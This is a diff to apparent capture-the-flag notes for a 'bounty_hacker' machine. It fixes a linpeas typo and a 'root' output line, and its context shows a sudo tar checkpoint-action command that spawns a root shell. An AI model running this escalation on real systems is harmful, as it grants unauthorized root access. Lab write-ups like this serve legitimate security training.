@@ -51,11 +51,11 @@ bounty_hacker machine run command
 
 run linpeas.sh 
 
-- bash linbeas.sh
+- bash linpeas.sh
 
 (root) /bin/tar (privilege escalation)
 
 run command : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 - whoami
-root
+#root
